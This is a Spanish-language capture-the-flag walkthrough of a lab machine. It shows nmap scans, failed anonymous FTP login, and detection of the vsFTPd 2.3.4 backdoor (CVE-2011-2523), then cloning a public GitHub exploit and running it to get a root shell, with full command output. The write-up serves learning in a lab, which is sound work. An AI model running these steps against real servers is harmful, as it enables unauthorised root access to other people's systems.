# Herramientas
- Nmap
- Github
- Python3
# Procedimiento
Escaneamos todos los puertos con nmap y solamente nos muestra que existe el servicio FTP (puerto 21):
```bash
nmap -p- 172.17.0.2                                                      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 21:30 -04  
Nmap scan report for 172.17.0.2  
Host is up (0.000010s latency).  
Not shown: 65534 closed tcp ports (reset)  
PORT   STATE SERVICE  
21/tcp open  ftp  
MAC Address: 02:42:AC:11:00:02 (Unknown)  
  
Nmap done: 1 IP address (1 host up) scanned in 1.91 seconds
```

Intentamos entrar con ftp usando el comando `ftp 172.17.0.2` y colocamos de usuario `anonymous` y sin contraseña, pero no son credenciales válidas. 
```bash
ftp 172.17.0.2       
Connected to 172.17.0.2.  
220 (vsFTPd 2.3.4)  
Name (172.17.0.2:mapacheroja): anonymous  
331 Please specify the password.  
Password:    
530 Login incorrect.  
ftp: Login failed  
ftp>    
ftp> exit  
221 Goodbye.
```

Volvemos a correr otro script de nmap que nos permita saber si algún servicio tiene una vulnerabilidad conocida con `--script=vuln`.
```bash
nmap -p- --script=vuln 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 21:40 -04  
Stats: 0:00:05 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan  
NSE Timing: About 0.00% done  
Stats: 0:00:29 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan  
NSE Timing: About 87.50% done; ETC: 21:40 (0:00:04 remaining)  
Pre-scan script results:  
| broadcast-avahi-dos:    
|   Discovered hosts:  
|     224.0.0.251  
|   After NULL UDP avahi packet DoS (CVE-2011-1002).  
|_  Hosts are all up (not vulnerable).  
Nmap scan report for 172.17.0.2  
Host is up (0.0000080s latency).  
Not shown: 65534 closed tcp ports (reset)  
PORT   STATE SERVICE  
21/tcp open  ftp  
| ftp-vsftpd-backdoor:    
|   VULNERABLE:  
|   vsFTPd version 2.3.4 backdoor  
|     State: VULNERABLE (Exploitable)  
|     IDs:  CVE:CVE-2011-2523  BID:48539  
|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.  
|     Disclosure date: 2011-07-03  
|     Exploit results:  
|       Shell command: id  
|       Results: uid=0(root) gid=0(root) groups=0(root)  
|     References:  
|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html  
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523  
|       https://www.securityfocus.com/bid/48539  
|_      https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb  
MAC Address: 02:42:AC:11:00:02 (Unknown)  
  
Nmap done: 1 IP address (1 host up) scanned in 41.05 seconds
```

Aquí nos muestra que existe una vulnerabilidad conocida relacionada a este protocolo, donde se puede crear un backdoor. Para esto, debemos buscar la vulnerabilidad en github para ver si alguien ha creado el código para explotar la vulnerabilidad, tan solo debemos buscar `CVE-2011-2523 exploit github` y escogemos un repositorio. En mi caso, escogí [este](https://github.com/Hellsender01/vsftpd_2.3.4_Exploit), tan solo debemos seguir las instrucciones existentes.

```bash
git clone https://github.com/Hellsender01/vsftpd_2.3.4_Exploit
cd CVE-2011-2523
```

Sin embargo, si no nos funciona la instalación debido a problemas con versiones de python, solamente debemos crear un entorno virtual e instalar los paquetes. Dentro de la carpeta introducimos la siguiente serie de comandos:

```
python3 -m venv venv
source venv/bin/activate
pip install pwntools
chmod +x exploit.py
```

NOTA: Una vez dejemos de ocupar nuestro entorno virtual, solamente debemos colocar `deactivate`.

Ahora, según el README, debemos ejecutar el código de la siguiente forma:
```
python3 exploit.py 172.17.0.2         
[+] Got Shell!!!  
[+] Opening connection to 172.17.0.2 on port 21: Done  
[*] Closed connection to 172.17.0.2 port 21  
[+] Opening connection to 172.17.0.2 on port 6200: Done  
[*] Switching to interactive mode
$ 
```

Con esto ya tenemos acceso root, y lo podemos comprobar con el comando `whoami`
```bash
$ whoami 

root  
$ ls  
AUDIT  
BENCHMARKS  
BUGS  
COPYING  
COPYRIGHT  
Changelog  
EXAMPLE  
FAQ  
INSTALL  
LICENSE  
Makefile  
README  
README.security  
README.ssl  
REFS  
REWARD  
RedHat  
SECURITY  
SIZE  
SPEED  
TODO  
TUNING  
access.c  
access.h  
access.o  
ascii.c  
ascii.h  
ascii.o
```